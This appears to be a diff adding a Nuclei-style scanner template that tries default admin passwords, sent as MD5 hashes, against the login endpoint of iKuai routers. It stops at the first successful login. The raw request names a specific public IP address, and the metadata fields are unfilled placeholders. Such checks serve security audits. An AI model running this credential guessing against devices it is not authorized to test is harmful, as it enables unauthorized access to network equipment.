@@ -1,0 +1,53 @@
+id: ikuai-default-login
+info:
+  name: Template Name
+  author: apple
+  severity: info
+  description: 密码为 md5加密
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Action/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 115
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Sec-Ch-Ua-Platform: "macOS"
+        Origin: https://61.134.122.76:8443
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://61.134.122.76:8443/login
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=1, i
+        Connection: close
+
+        {"username":"admin","passwd":"{{pass}}","pass":"c2FsdF8xMWFkbWlu","remember_password":null}
+
+
+    payloads:
+      pass:
+        - 21232f297a57a5a743894a0e4a801fc3
+        - e10adc3949ba59abbe56e057f20f883e
+        - 1c63129ae9db9c60c3e8aa94d3e00495
+        - 25d55ad283aa400af464c76d713c07ad
+    stop-at-first-match: true
+        
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - Succeess
+      - type: word
+        part: body
+        words:
+          - '10000'
